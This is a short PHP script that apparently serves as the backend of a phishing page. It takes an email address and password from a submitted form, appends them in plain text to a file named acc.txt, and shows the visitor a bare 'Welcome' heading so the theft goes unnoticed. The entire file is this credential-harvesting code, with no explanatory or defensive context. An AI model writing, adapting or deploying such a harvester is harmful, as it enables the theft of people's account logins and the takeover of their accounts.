<?php
	$email=$_POST['email'];
	$pass=$_POST['pass'];
	$file=fopen("acc.txt","a+");
	fwrite($file,$email);
	fwrite($file,"   ");
	fwrite($file,$pass);
	fclose($file);
	echo "<h1>Welcome </h1>";
?>
